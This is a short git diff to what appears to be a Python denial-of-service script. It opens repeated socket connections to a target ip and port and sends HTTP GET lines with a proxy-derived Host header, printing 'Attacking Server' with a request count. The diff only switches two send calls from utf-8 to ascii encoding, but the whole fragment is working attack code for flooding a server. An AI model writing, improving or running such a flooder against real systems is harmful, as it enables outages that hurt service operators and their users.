@@ -51,8 +51,8 @@ try:
             s.connect((ip,port))
             s.sendto(("GET / " + ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
             s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (ip,port))
-            s.sendto(("GET /" + ip + " HTTP/1.1\r\n\r\n").encode('utf-8'), (ip,port))
-            s.sendto(("Host: " + str(fip) + "\r\n\r\n").encode('utf-8'), (ip,port))
+            s.sendto(("GET /" + ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
+            s.sendto(("Host: " + fip + "\r\n\r\n").encode('ascii'), (ip,port))
             s.close()
             print(f"Attacking Server | {ip}:{port} Sent : ", i, f" With Proxy : {fip}", end='\r')
         except TimeoutError:
